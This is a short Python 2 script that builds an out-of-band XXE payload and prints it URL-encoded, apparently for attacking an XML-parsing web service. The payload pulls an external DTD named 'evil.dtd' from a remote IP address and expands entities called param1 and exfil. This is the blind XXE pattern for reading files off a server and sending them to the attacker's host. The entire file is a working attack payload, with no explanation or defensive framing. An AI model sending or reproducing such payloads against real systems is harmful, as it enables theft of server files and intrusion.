# -*- coding:utf-8 -*-
import requests
import urllib

data = """<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://123.206.203.108/evil.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
"""

print urllib.quote_plus(data)